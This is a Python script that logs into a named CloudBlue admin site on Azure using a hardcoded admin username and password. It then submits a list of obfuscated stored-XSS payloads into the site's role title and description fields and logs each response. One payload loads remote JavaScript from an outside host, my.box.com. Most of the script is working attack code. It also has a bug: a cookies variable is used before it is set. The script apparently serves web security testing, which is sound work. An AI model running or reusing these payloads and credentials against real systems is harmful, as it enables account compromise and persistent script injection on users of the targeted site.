import requests
from bs4 import BeautifulSoup
from datetime import datetime
from urllib.parse import urljoin

loginURL = 'https://cbplatform.azurewebsites.net/cloudblue/login/auth'
roleEditPageURL = 'https://cbplatform.azurewebsites.net/cloudblue/role/edit'
dashboardURL = 'https://cbplatform.azurewebsites.net/cloudblue/dashboard/myAccountInfo'

with requests.Session() as session:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0'}
    request = session.get(loginURL, headers=headers)
    # for cookie in session.cookies:
    #     print(cookie)
    parsedHTML = BeautifulSoup(request.content, 'lxml')
    htmlForms = parsedHTML.find_all('form')
    # for htmlForm in range(len(htmlForms)):
    #     print(htmlForm)
    #     print(htmlForms[htmlForm])
    print(htmlForms)
    loginForm = htmlForms[0]
    # print(loginForm)
    CSRFForm = htmlForms[2]
    loginFields = loginForm.findAll('input')
    csrfFields = CSRFForm.find_all('input')
    formdata = dict((field.get('name'), field.get('value'))
                    for field in loginFields)
    formdata.update((field.get('name'), field.get('value'))
                    for field in csrfFields)
    # print(formdata)
    formdata['username'] = u'admin'
    formdata['password'] = u'Ingram12#'
    formdata['eas_sec_canv'] = u'2173185164:4280504333:2173185164:2515967111'
    print(formdata)
    posturl = urljoin(loginURL, loginForm['action'])
    # print(loginForm['action'])

    # print(posturl)
    postRequest = session.post(
        posturl, data=formdata, cookies=cookies, headers=headers)
    cookies = session.cookies
    # print(postRequest.text)
    parsedHTML = BeautifulSoup(postRequest.content, 'lxml')
    # print(parsedHTML)
    dashboard = session.get(dashboardURL, cookies=cookies, headers=headers)
    parsedHTML = BeautifulSoup(dashboard.content, 'lxml')
    # print(parsedHTML)
    roleEditPage = session.get(
        roleEditPageURL, cookies=cookies, headers=headers)
    parsedHTML = BeautifulSoup(roleEditPage.content, 'lxml')
    htmlForms = parsedHTML.find(
        name='form', attrs={'name': 'role-edit-form'})
    print(htmlForms)
    roleEditPageSaveURL = urljoin(loginURL, htmlForms['action'])
    # for htmlForm in range(len(htmlForms)):
    #     print(htmlForm)
    #     print(htmlForms[htmlForm])
    # print(roleEditPageSaveURL)
    cookies = session.cookies
    inputFields = parsedHTML.findAll('input')
    roleEditPageFormData = dict((field.get('name'), '' if field.get('value') is None else field.get('value'))
                                for field in inputFields)
    # for inputFieldName, inputFieldValue in roleEditPageFormData.items():
    #     print(inputFieldName, inputFieldValue)
    payLoads = [u'''<script>alert("hi");</script>''',
                u'''</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>
eval(a+b+c+d);
a=""get"";b=""URL(ja\"""";c=""vascr"";d=""ipt:ale"";e=""rt('XSS');\"")"";eval(a+b+c+d+e);
<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>
<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>
<in<input onfocus=javascript:alert(1) autofocus>put onfocus=javascript:alert(1) autofo<input onfocus=javascript:alert(1) autofocus>cus>''',
                u'''<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;
&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;
&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>iv id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E''',
                u'''testPayload4''',
                u'''nitishPayload'''
                ]
    for payLoad in payLoads:
        roleEditPageFormData['role.organizationType'] = 'SERVICEPROVIDER'
        roleEditPageFormData['role.title'] = payLoad
        roleEditPageFormData['role.authorityLevel'] = '1'
        roleEditPageFormData['role.description'] = payLoad
        roleEditPageFormData['permission.187'] = 'on'
        postRequest = session.post(
            roleEditPageSaveURL, data=roleEditPageFormData, cookies=cookies, headers=headers)
        print(postRequest.request)
        # print(postRequest.history)
        with open('output/response.log', 'a+') as responseLogFile:
            log = 'Payload: ------------->\n' + payLoad + '\nPOST request URL: ' + roleEditPageSaveURL + '\nResponse history if redirected:' + \
                str(postRequest.request.body) + \
                '\nResponse execution time:' + str(datetime.now()) + '\n'
            responseLogFile.write(log)

        with open('output/responseContents.html', 'a+') as responseLogFile:
            responseLogFile.write(postRequest.text)
